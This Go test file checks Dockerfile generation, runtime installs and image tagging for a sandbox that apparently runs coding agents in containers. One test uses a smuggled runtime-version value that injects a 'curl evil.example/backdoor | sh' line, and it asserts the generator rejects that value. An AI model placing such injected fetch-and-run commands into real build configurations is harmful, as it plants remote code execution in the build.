package sandbox

import (
	"context"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/phs/dark-factory/internal/config"
)

func TestDefaultConfig(t *testing.T) {
	dc := DefaultDockerConfig()
	if dc.Image != "ubuntu:22.04" {
		t.Errorf("Image = %q, want ubuntu:22.04", dc.Image)
	}
	if dc.Runtime.Name != "" {
		t.Errorf("Runtime.Name = %q, want empty string", dc.Runtime.Name)
	}
	if dc.Runtime.Version != "" {
		t.Errorf("Runtime.Version = %q, want empty string", dc.Runtime.Version)
	}
	if dc.NodeVersion != "20" {
		t.Errorf("NodeVersion = %q, want 20", dc.NodeVersion)
	}
	if dc.User != "devloop" {
		t.Errorf("User = %q, want devloop", dc.User)
	}
}

func TestDockerConfigFromConfig(t *testing.T) {
	docker := config.Docker{
		Image:         "debian:bookworm",
		NodeVersion:   "18",
		User:          "runner",
		Mount:         "/src",
		ExtraPackages: []string{"vim", "jq"},
	}
	runtime := config.Runtime{Name: "go", Version: "1.26.0"}
	dc := DockerConfigFromConfig(docker, runtime, map[string]string{"GOOS": "linux"})

	if dc.Image != "debian:bookworm" {
		t.Errorf("Image = %q, want debian:bookworm", dc.Image)
	}
	if dc.Runtime.Name != "go" {
		t.Errorf("Runtime.Name = %q, want go", dc.Runtime.Name)
	}
	if dc.Runtime.Version != "1.26.0" {
		t.Errorf("Runtime.Version = %q, want 1.26.0", dc.Runtime.Version)
	}
	if dc.NodeVersion != "18" {
		t.Errorf("NodeVersion = %q, want 18", dc.NodeVersion)
	}
	if dc.User != "runner" {
		t.Errorf("User = %q, want runner", dc.User)
	}
	if dc.Mount != "/src" {
		t.Errorf("Mount = %q, want /src", dc.Mount)
	}
	if len(dc.ExtraPackages) != 2 {
		t.Fatalf("ExtraPackages len = %d, want 2", len(dc.ExtraPackages))
	}
}

func TestDockerConfigFromConfigDefaults(t *testing.T) {
	dc := DockerConfigFromConfig(config.Docker{}, config.Runtime{}, nil)
	def := DefaultDockerConfig()

	if dc.Image != def.Image {
		t.Errorf("Image = %q, want default %q", dc.Image, def.Image)
	}
	if dc.Runtime.Name != "" {
		t.Errorf("Runtime.Name = %q, want empty string", dc.Runtime.Name)
	}
	if dc.Runtime.Version != "" {
		t.Errorf("Runtime.Version = %q, want empty string", dc.Runtime.Version)
	}
}

func TestGenerateDockerfileDefault(t *testing.T) {
	df, err := GenerateDockerfile(DefaultDockerConfig(), slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	checks := []struct {
		name    string
		contain string
	}{
		{"base image", "FROM ubuntu:22.04"},
		{"claude-code", "npm install -g @anthropic-ai/claude-code"},
		{"user directive", "USER devloop"},
		{"workdir", "WORKDIR /workspace"},
		{"node install", "setup_20.x"},
		{"useradd", "useradd -m -s /bin/bash devloop"},
		{"python3 install", "python3"},
		{"pip sdk install", "pip install 'claude-agent-sdk>=0.1.0,<0.2.0'"},
		{"copy agent runner", "COPY agent_runner.py /usr/local/bin/agent_runner.py"},
	}
	for _, c := range checks {
		if !strings.Contains(df, c.contain) {
			t.Errorf("%s: Dockerfile missing %q", c.name, c.contain)
		}
	}
}

func TestGenerateDockerfileCustomImage(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.Image = "debian:bookworm"

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if !strings.Contains(df, "FROM debian:bookworm") {
		t.Error("Dockerfile missing custom base image")
	}
}

func TestGenerateDockerfileCustomGoVersion(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.Runtime.Name = "go"
	cfg.Runtime.Version = "1.22"

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if !strings.Contains(df, "go1.22.linux-amd64.tar.gz") {
		t.Error("Dockerfile missing custom Go version URL")
	}
}

func TestGenerateDockerfileExtraPackages(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.ExtraPackages = []string{"vim", "jq"}

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if !strings.Contains(df, "vim") || !strings.Contains(df, "jq") {
		t.Error("Dockerfile missing extra packages")
	}
}

func TestGenerateDockerfileNonRootUser(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.User = "myuser"

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if !strings.Contains(df, "useradd -m -s /bin/bash myuser") {
		t.Error("Dockerfile missing useradd for custom user")
	}
	if !strings.Contains(df, "USER myuser") {
		t.Error("Dockerfile missing USER directive for custom user")
	}
}

func TestImageTagDeterministic(t *testing.T) {
	tag1 := ImageTag("FROM ubuntu:22.04\n")
	tag2 := ImageTag("FROM ubuntu:22.04\n")
	if tag1 != tag2 {
		t.Errorf("tags differ for same content: %q vs %q", tag1, tag2)
	}

	if !strings.HasPrefix(tag1, "godark-runner:") {
		t.Errorf("tag missing prefix: %q", tag1)
	}
}

func TestImageTagChangesWithContent(t *testing.T) {
	tag1 := ImageTag("FROM ubuntu:22.04\n")
	tag2 := ImageTag("FROM debian:bookworm\n")
	if tag1 == tag2 {
		t.Error("tags should differ for different content")
	}
}

func TestBuildImageStubbedCommandRunner(t *testing.T) {
	orig := CommandRunner
	defer func() { CommandRunner = orig }()

	var capturedArgs []string
	CommandRunner = func(name string, args ...string) ([]byte, error) {
		capturedArgs = append([]string{name}, args...)
		return []byte("Successfully built"), nil
	}

	logger := slog.Default()
	tag, err := BuildImage(context.Background(), DefaultDockerConfig(), logger)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if !strings.HasPrefix(tag, "godark-runner:") {
		t.Errorf("tag missing prefix: %q", tag)
	}

	if len(capturedArgs) == 0 {
		t.Fatal("CommandRunner was not called")
	}
	if capturedArgs[0] != "docker" {
		t.Errorf("expected docker command, got %q", capturedArgs[0])
	}
	if capturedArgs[1] != "build" {
		t.Errorf("expected build subcommand, got %q", capturedArgs[1])
	}

	// Verify -t flag with tag
	foundTag := false
	for i, arg := range capturedArgs {
		if arg == "-t" && i+1 < len(capturedArgs) && capturedArgs[i+1] == tag {
			foundTag = true
			break
		}
	}
	if !foundTag {
		t.Errorf("docker build missing -t %s in args: %v", tag, capturedArgs)
	}
}

func TestBuildImageWritesAgentRunner(t *testing.T) {
	orig := CommandRunner
	defer func() { CommandRunner = orig }()

	var agentRunnerFound bool
	CommandRunner = func(name string, args ...string) ([]byte, error) {
		// During docker build, check that agent_runner.py is present in the build context.
		if name == "docker" && len(args) > 0 && args[0] == "build" {
			// The build context dir is the last argument.
			buildDir := args[len(args)-1]
			pyPath := filepath.Join(buildDir, "agent_runner.py")
			if _, err := os.Stat(pyPath); err == nil {
				agentRunnerFound = true
			}
		}
		return []byte("Successfully built"), nil
	}

	_, err := BuildImage(context.Background(), DefaultDockerConfig(), slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if !agentRunnerFound {
		t.Error("agent_runner.py was not written to the build context before docker build")
	}
}

func TestGenerateDockerfileIncludesPython3(t *testing.T) {
	df, err := GenerateDockerfile(DefaultDockerConfig(), slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(df, "python3") {
		t.Error("Dockerfile missing python3 in apt-get install")
	}
}

func TestGenerateDockerfileIncludesPipInstall(t *testing.T) {
	df, err := GenerateDockerfile(DefaultDockerConfig(), slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(df, "pip install 'claude-agent-sdk>=0.1.0,<0.2.0'") {
		t.Error("Dockerfile missing pinned claude-agent-sdk install")
	}
}

func TestGenerateDockerfileCopiesAgentRunner(t *testing.T) {
	df, err := GenerateDockerfile(DefaultDockerConfig(), slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(df, "COPY agent_runner.py /usr/local/bin/agent_runner.py") {
		t.Error("Dockerfile missing COPY agent_runner.py directive")
	}
}

func TestGenerateDockerfileGoRuntime(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.Runtime = config.Runtime{Name: "go", Version: "1.26.0"}

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(df, "go1.26.0.linux-amd64.tar.gz") {
		t.Error("Go Dockerfile missing expected tarball URL")
	}
}

func TestGenerateDockerfileFlutterRuntime(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.Runtime = config.Runtime{Name: "flutter"}

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(df, "git clone") || !strings.Contains(df, "flutter") {
		t.Error("Flutter Dockerfile missing git clone of flutter")
	}
	if !strings.Contains(df, "flutter precache") {
		t.Error("Flutter Dockerfile missing flutter precache")
	}
}

func TestGenerateDockerfileNodeRuntime(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.Runtime = config.Runtime{Name: "node"}

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// Node.js is installed exactly once (for Claude Code), not a second time for the runtime.
	count := strings.Count(df, "nodesource.com")
	if count != 1 {
		t.Errorf("expected exactly 1 Node.js install, got %d", count)
	}
}

func TestGenerateDockerfileRustRuntime(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.Runtime = config.Runtime{Name: "rust"}

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(df, "rustup") {
		t.Error("Rust Dockerfile missing rustup")
	}
}

func TestGenerateDockerfilePythonRuntime(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.Runtime = config.Runtime{Name: "python"}

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(df, "python3-venv") {
		t.Error("Python Dockerfile missing python3-venv")
	}
}

func TestGenerateDockerfileEmptyRuntime(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.Runtime = config.Runtime{Name: ""}

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("empty runtime should not return error: %v", err)
	}
	// No Go, Flutter, Rust, or Python-venv-specific install expected.
	if strings.Contains(df, "go.dev/dl") {
		t.Error("empty runtime Dockerfile should not install Go")
	}
	if strings.Contains(df, "rustup") {
		t.Error("empty runtime Dockerfile should not install Rust")
	}
	if strings.Contains(df, "flutter") {
		t.Error("empty runtime Dockerfile should not install Flutter")
	}
}

func TestGenerateDockerfileGoRequiresVersion(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.Runtime = config.Runtime{Name: "go", Version: ""}

	_, err := GenerateDockerfile(cfg, slog.Default())
	if err == nil {
		t.Fatal("expected error for Go runtime without version, got nil")
	}
}

func TestGenerateDockerfileFlutterNoVersionUsesStable(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.Runtime = config.Runtime{Name: "flutter", Version: ""}

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(df, "--branch stable") {
		t.Error("Flutter Dockerfile without version should use stable branch")
	}
}

func TestGenerateDockerfileSandboxEnv(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.SandboxEnv = map[string]string{"GOOS": "linux"}

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(df, `ENV GOOS="linux"`) {
		t.Error(`Dockerfile missing ENV GOOS="linux" from SandboxEnv`)
	}
}

func TestGenerateDockerfileSandboxEnvValueWithSpaces(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.SandboxEnv = map[string]string{"FOO": "bar baz"}

	df, err := GenerateDockerfile(cfg, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(df, `ENV FOO="bar baz"`) {
		t.Error(`Dockerfile missing ENV FOO="bar baz" — value with spaces must be quoted`)
	}
}

func TestGenerateDockerfileSandboxEnvNewlineRejected(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.SandboxEnv = map[string]string{"FOO": "bar\nbaz"}

	_, err := GenerateDockerfile(cfg, slog.Default())
	if err == nil {
		t.Fatal("expected error for SandboxEnv value containing newline, got nil")
	}
}

func TestGenerateDockerfileSandboxEnvDoubleQuoteRejected(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.SandboxEnv = map[string]string{"FOO": `bar"baz`}

	_, err := GenerateDockerfile(cfg, slog.Default())
	if err == nil {
		t.Fatal("expected error for SandboxEnv value containing double quote, got nil")
	}
}

func TestGenerateDockerfileRuntimeVersionNewlineRejected(t *testing.T) {
	cfg := DefaultDockerConfig()
	cfg.Runtime = config.Runtime{Name: "flutter", Version: "stable\nRUN curl http://evil.example/backdoor | sh"}

	_, err := GenerateDockerfile(cfg, slog.Default())
	if err == nil {
		t.Fatal("expected error for Runtime.Version containing newline, got nil")
	}
}

func TestGenerateDockerfileClaudeCodeAlwaysPresent(t *testing.T) {
	runtimes := []config.Runtime{
		{Name: "go", Version: "1.26.0"},
		{Name: "flutter"},
		{Name: "node"},
		{Name: "rust"},
		{Name: "python"},
		{Name: ""},
	}
	for _, rt := range runtimes {
		cfg := DefaultDockerConfig()
		cfg.Runtime = rt
		df, err := GenerateDockerfile(cfg, slog.Default())
		if err != nil {
			t.Fatalf("runtime %q: unexpected error: %v", rt.Name, err)
		}
		if !strings.Contains(df, "npm install -g @anthropic-ai/claude-code") {
			t.Errorf("runtime %q: Dockerfile missing Claude Code install", rt.Name)
		}
	}
}

func TestImageTagChangesWithRuntime(t *testing.T) {
	cfgGo := DefaultDockerConfig()
	cfgGo.Runtime = config.Runtime{Name: "go", Version: "1.26.0"}
	dfGo, err := GenerateDockerfile(cfgGo, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	cfgNode := DefaultDockerConfig()
	cfgNode.Runtime = config.Runtime{Name: "node"}
	dfNode, err := GenerateDockerfile(cfgNode, slog.Default())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	tagGo := ImageTag(dfGo)
	tagNode := ImageTag(dfNode)
	if tagGo == tagNode {
		t.Error("image tags should differ when runtime changes")
	}
}
